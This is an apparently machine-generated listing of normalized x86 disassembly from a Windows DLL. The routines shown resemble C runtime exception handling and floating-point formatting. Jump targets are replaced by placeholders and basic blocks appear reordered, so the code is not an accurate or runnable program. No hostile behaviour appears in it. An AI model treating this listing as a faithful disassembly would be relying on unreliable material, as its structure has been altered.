cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_1001cd33
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_1001d181
pop ecx
pop ecx
sub_1001d45f
push 0xc
push r--data
call sub_10011ecc
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_1001e7d9
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_1001e7d9
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1001960e
push ebx
push esi
call sub_1001e7d9
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1001e7d9
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1001e7d9
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_1001e7d9
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_1001e7d9
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_1001e7d9
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_10019bd0
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_1001e7d9
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_1001d1d6
pop ecx
pop ecx
push eax
push esi
call sub_10019bd0
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_10011f11
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_1001d1d6
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_1001d5de
push 0x8
push r--data
call sub_10011ecc
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1001d1d6
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_1001ca58
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_1001d45f
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10011f11
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1001d1d6
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_1001ca58
jmp r-xdata
sub_1001d670
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_1001d5de
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_1001ca26
call sub_1001ca5f
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_1001d05b
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_1001d2c3
add esp 0x28
test eax eax
je r-xdata
sub_1001d6de
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_1000e343
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_1000e343
lea edi [ eax + 0x80 ]
call sub_1000e0b1
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_1001cc92
mov edi eax
mov eax [ ebp - 0x4 ]
add esp 0x14
cmp eax [ ebp - 0x8 ]
jae r-xdata
call sub_1001960e
cmp [ esi ] 0xe0434f4d
je r-xdata
pop edi
push ebx
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1001cb1c
add esp 0x1c
test eax eax
jne r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x14
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp esi [ edi + 0x4 ]
jg r-xdata
cmp esi [ edi ]
jl r-xdata
pop ebx
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
lea ebx [ eax - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001d670
mov esi [ ebp + 0x1c ]
add esp 0x1c
sub_1001d7d2
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
cmp eax 0x80
push esi
push edi
mov [ ebp - 0x1 ] 0x0
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_1001960e
cmp ecx eax
jl r-xdata
cmp ecx 0xffffffff
mov [ ebp - 0x8 ] ecx
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_1000e343
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_1001960e
call sub_100195c2
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1001d6de
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_1000e343
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_1000e343
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_1000e343
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_1001e7d9
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_1001cc92
add esp 0x14
mov edi eax
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_1001960e
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_1001d181
pop ecx
pop ecx
mov edi [ ebp + 0x18 ]
mov eax [ ebp - 0x8 ]
cmp [ edi ] eax
jg r-xdata
call sub_1000e343
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
add edi 0x14
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
call sub_1000e343
mov edi [ eax + 0x94 ]
call sub_1000e343
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_1001d1ff
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov eax [ edi + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_1001d1ff
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_1000b81c
test al al
jne r-xdata
call sub_1001960e
cmp eax 0x19930522
jne r-xdata
call sub_1000e343
call sub_1000e343
call sub_1000e343
mov [ eax + 0x88 ] esi
call sub_1000e343
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
call sub_1001cfb3
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_1001d181
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x2c ]
call sub_1001cf63
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_100122ea
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov ebx [ ebp - 0xc ]
push [ ebp + 0x20 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_1001d670
mov esi [ ebp + 0x8 ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_1001ca5f
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1001d05b
add esp 0x10
push [ esi + 0x1c ]
call sub_1001d27a
sub_1001db36
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_1000e343
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_1001d7d2
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1001d05b
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1001dc20
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_1001b8a4
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_1001b8a4
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_1001dc6c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_1001b9e4
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_10018646
test eax eax
movsx eax [ esi ]
push eax
call sub_1001b9e4
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
inc esi
inc esi
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1001dcdf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_1001dd61
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_1001dd7d
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_1001e8c5
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_1001e81d
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_1001ddd9
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_1000b9b0
inc eax
push eax
push esi
add esi edi
push esi
call sub_10019bd0
add esp 0x10
sub_1001de1e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_1000afe5
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebp + 0x8 ] esi
jbe r-xdata
call sub_1000e8db
push 0x16
cmp [ ebp + 0xc ] esi
jle r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] 0x0
je r-xdata
call sub_1000e8db
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] esi
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_1001ddd9
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_1000e873
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
lea eax [ esi + 0x1 ]
mov cl [ eax ]
mov [ esi ] cl
mov esi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1000e74b
add esp 0x14
push r--data
push ebx
push esi
call sub_1001479b
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
inc esi
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
inc esi
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi ] 0x2d
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_10019bd0
add esp 0xc
inc esi
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi ] al
mov eax edx
add [ esi + 0x1 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi ] al
mov eax edx
sub_1001df8d
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1001eae9
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1000e873
add esp 0x14
mov eax esi
jmp r-xdata
mov esi [ ebp + 0x14 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
cmp esi ebx
setg cl
sub eax ecx
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push ebx
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_1001de1e
add esp 0x18
mov [ edi ] bl
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
cmp esi ebx
setg cl
add eax edi
add ecx eax
push ecx
call sub_1001e96d
add esp 0x10
cmp eax ebx
je r-xdata
sub_1001e05d
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001df8d
add esp 0x18
pop ebp
retn
sub_1001e07d
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_1000afe5
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_1000e8db
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_1000e8db
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_1000e873
add esp 0x14
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
mov [ esi ] 0x30
inc esi
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
mov ecx [ edi + 0x4 ]
inc esi
neg ebx
sbb ebx ebx
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x31
inc esi
mov [ esi ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
inc esi
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_1001e05d
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
mov [ esi ] 0x30
inc esi
cmp [ ebp + 0x18 ] 0x0
push 0x65
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
inc esi
push esi
call sub_1001e7f0
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_1001ec60
add ax 0x30
movzx eax ax
cmp ax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_1001ec60
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_1000b660
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
inc esi
call sub_1001ec60
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi ] 0x2d
inc esi
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi ] 0x2b
inc esi
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_1001eb80
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
cmp edx ebx
mov edi esi
mov [ esi ] 0x30
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_1001eb80
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_1001eb80
add al 0x30
